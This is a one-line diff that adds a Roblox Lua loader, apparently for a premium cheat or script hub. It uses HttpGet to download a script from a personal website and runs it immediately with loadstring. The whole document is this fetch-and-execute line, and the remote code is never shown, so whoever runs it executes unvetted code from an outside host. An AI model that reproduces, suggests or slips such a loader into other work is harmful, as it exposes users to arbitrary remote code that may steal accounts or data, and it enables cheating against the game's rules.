@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://isnahamzah.site/SubscribeYTisnahamzah/quantumprem.lua"))()
